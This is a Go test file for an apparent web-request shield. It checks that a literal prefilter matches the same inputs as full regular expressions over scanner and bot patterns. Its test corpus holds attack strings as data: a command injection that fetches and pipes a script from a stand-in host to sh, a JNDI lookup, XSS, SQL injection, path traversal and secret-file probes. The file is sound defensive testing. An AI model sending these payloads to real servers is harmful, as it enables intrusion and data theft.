package shield

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// The prefilter must never change a verdict: for every pattern in the catalog and a corpus of attacks, bots and
// browsers, matcher and plain regexp agree.
func TestMatcherAgreesWithRegexp(t *testing.T) {
	var pats []string
	sc, _ := LoadScoring([]string{repoCatalog}, "", ScoringOverrides{})
	bs, _ := LoadScoringSet([]string{repoCatalog}, "bots.yaml", "", ScoringOverrides{})
	for _, set := range []*Scoring{sc, bs} {
		for _, s := range set.Signals {
			pats = append(pats, s.Match)
			if s.Also != nil {
				pats = append(pats, s.Also.Match)
			}
		}
	}
	bc, _ := LoadBots([]string{repoCatalog}, "", nil)
	for _, a := range bc.Agents {
		if a.UA != "" {
			pats = append(pats, a.UA)
		}
		for _, h := range a.Header {
			pats = append(pats, h)
		}
	}
	files, _ := filepath.Glob(filepath.Join(repoCatalog, "http", "*.yaml"))
	for _, f := range files { // rule patterns: every quoted string that compiles
		b, _ := os.ReadFile(f)
		for _, l := range strings.Split(string(b), "\n") {
			if i := strings.Index(l, "'"); i >= 0 {
				if j := strings.LastIndex(l, "'"); j > i {
					pats = append(pats, strings.ReplaceAll(l[i+1:j], "''", "'"))
				}
			}
		}
	}
	corpus := []string{"", "GET", "/", "/index.html", "/.env", "/.ENV", "/.git/config", "/wp-login.php", "/WP-Admin/",
		"/search?q=<ScRiPt>alert(1)</script>", "/x?u=javascript:alert(1)", "/a/../../etc/passwd", "/a/..%2f..%2fetc",
		"/q?id=1' OR '1'='1", "/q?id=1 union select password from users", "/q?x=${jndi:ldap://x/a}",
		"/q?c=;wget http://x/a.sh|sh", "php://filter/resource=index", "/?XDEBUG_SESSION_START=1", chromeUA,
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "sqlmap/1.7", "Nuclei - Open-source",
		"masscan/1.3", "curl/8.5.0", "python-requests/2.31", "HeadlessChrome/120", "Mozilla/5.0 (compatible; MJ12bot/v1.4.8)",
		"GPTBot/1.2", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)", "zgrab/0.x", "Go-http-client/1.1", "\x16\x03\x01",
		"Cookie: mstshash=admin", "PRI * HTTP/2.0", "PROPFIND", "Mozlila/5.0", "Mozilla/5.0 (X11) Gecko/20100101 Firefox/128.0",
		"ſcript ⁄ <scrİpt>", "/İNDEX", "Chrome/99.0", "/robots.txt", "/sitemap_index.xml", "\"https://chatgpt.com\""}
	for _, p := range pats {
		re, err := regexp.Compile(p)
		if err != nil {
			continue
		}
		m, _ := compileMatcher(p)
		for _, in := range corpus {
			for _, v := range []string{in, strings.ToUpper(in), strings.ToLower(in)} {
				if got, want := m.MatchString(v), re.MatchString(v); got != want {
					t.Errorf("pattern %q on %q: matcher %v, regexp %v (literals %q)", p, v, got, want, m.lits)
				}
			}
		}
	}
	if len(pats) < 100 {
		t.Fatalf("only %d patterns checked", len(pats))
	}
}

func TestRequiredLiterals(t *testing.T) {
	for pat, want := range map[string]string{
		`(?i)sqlmap|nikto|masscan`: "sqlmap nikto masscan",
		`^curl/`:                   "curl/",
		`archive\.org_bot`:         "archive.org_bot",
		`(?i)/\.git/`:              "/.git/",
		`^\s*$`:                    "",
		`Chrome/\d`:                "chrome/",
	} {
		m, err := compileMatcher(pat)
		if err != nil {
			t.Fatal(err)
		}
		if got := strings.Join(m.lits, " "); got != want {
			t.Errorf("%s: %q, want %q", pat, got, want)
		}
	}
}
